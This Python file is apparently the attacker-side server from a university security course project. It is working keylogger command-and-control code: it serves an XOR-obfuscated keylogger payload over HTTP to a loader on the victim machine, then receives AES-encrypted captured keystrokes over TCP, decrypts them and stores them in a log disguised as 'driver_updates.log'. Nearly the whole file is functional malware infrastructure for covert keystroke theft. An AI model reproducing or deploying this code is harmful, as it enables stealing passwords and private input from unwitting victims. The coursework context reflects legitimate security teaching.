"""
server.py — Lado atacante
Proyecto Unidad 2 - Seguridad Informática · Universidad de Talca

Ejecutar en la máquina del atacante ANTES de activar el keylogger.
Uso: python server.py

Flujo:
  1. Escucha conexiones TCP entrantes en SERVER_PORT
  2. Lee el payload con protocolo length-prefix (4 bytes + datos)
  3. Descifra con AES-256-GCM usando la clave compartida
  4. Muestra las teclas capturadas en pantalla y las guarda en received_logs.txt
"""

import os
import socket
import struct
import threading
import types
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

import config

PAYLOAD_PORT = 8080
XOR_KEY = b"SecurityUTalca2026"

RECEIVED_LOG = "driver_updates.log"


def _xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

# ---------------------------------------------------------------------------
# DESCIFRADO — AES-256-GCM
# ---------------------------------------------------------------------------

def _decrypt(data: bytes, key: bytes) -> str:
    """
    Descifra un mensaje cifrado con AES-256-GCM.

    Parámetros:
        data: nonce (12 bytes) + ciphertext + tag (16 bytes).
        key: clave de 32 bytes — debe coincidir con la del keylogger.

    Retorna:
        str: texto plano descifrado.

    Lanza:
        InvalidTag si la clave es incorrecta o el mensaje fue alterado.
    """
    nonce, ciphertext_tag = data[:12], data[12:]
    return AESGCM(key).decrypt(nonce, ciphertext_tag, None).decode("utf-8")


# ---------------------------------------------------------------------------
# SERVIDOR HTTP — sirve el payload al loader en la víctima
# ---------------------------------------------------------------------------

class _PayloadHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/payload":
            with open("keylogger.py", "r", encoding="utf-8") as f:
                keylogger_code = f.read()

            config_block = (
                "import sys, types as _t\n"
                "_m = _t.ModuleType('config')\n"
                f"_m.LOG_FILE = r'{config.LOG_FILE}'\n"
                f"_m.APP_NAME = '{config.APP_NAME}'\n"
                f"_m.SERVER_HOST = '{config.SERVER_HOST}'\n"
                f"_m.SERVER_PORT = {config.SERVER_PORT}\n"
                f"_m.SEND_INTERVAL = {config.SEND_INTERVAL}\n"
                f"_m.ENCRYPTION_KEY = '{config.ENCRYPTION_KEY}'\n"
                "sys.modules['config'] = _m\n"
                "del _m\n"
            )
            plaintext = (config_block + keylogger_code).encode("utf-8")
            payload = _xor(plaintext, XOR_KEY)

            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass


def _start_payload_server():
    httpd = HTTPServer(("0.0.0.0", PAYLOAD_PORT), _PayloadHandler)
    print(f"[*] Payload HTTP en 0.0.0.0:{PAYLOAD_PORT}/payload")
    httpd.serve_forever()


# ---------------------------------------------------------------------------
# SERVIDOR TCP
# ---------------------------------------------------------------------------

def _recv_exact(sock: socket.socket, n: int) -> bytes:
    """
    Lee exactamente n bytes del socket.
    TCP no garantiza que recv() retorne todos los bytes de una vez, por eso se itera.
    """
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Conexión cerrada antes de leer todos los bytes")
        data += chunk
    return data


def _handle(conn: socket.socket, addr: tuple, key: bytes) -> None:
    """
    Procesa una conexión: lee el payload, descifra y guarda.
    """
    try:
        length = struct.unpack(">I", _recv_exact(conn, 4))[0]
        payload = _recv_exact(conn, length)
        plaintext = _decrypt(payload, key)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        separator = "=" * 60
        print(f"\n{separator}\n[{timestamp}] de {addr[0]}:{addr[1]}\n{separator}")
        print(plaintext)

        with open(RECEIVED_LOG, "a", encoding="utf-8") as f:
            f.write(f"\n{separator}\n[{timestamp}] de {addr[0]}:{addr[1]}\n{separator}\n")
            f.write(plaintext)

    except Exception as e:
        print(f"[!] Error con {addr[0]}: {e}")
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# PUNTO DE ENTRADA
# ---------------------------------------------------------------------------

def main() -> None:
    key = bytes.fromhex(config.ENCRYPTION_KEY)

    t = threading.Thread(target=_start_payload_server, daemon=True)
    t.start()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", config.SERVER_PORT))
        srv.listen(5)
        print(f"[*] Escuchando en 0.0.0.0:{config.SERVER_PORT}")
        print(f"[*] Logs en: {os.path.abspath(RECEIVED_LOG)}")
        print("[*] Ctrl+C para detener\n")

        while True:
            try:
                conn, addr = srv.accept()
                print(f"[+] Conexión de {addr[0]}:{addr[1]}")
                _handle(conn, addr, key)
            except KeyboardInterrupt:
                print("\n[*] Servidor detenido.")
                break


if __name__ == "__main__":
    main()
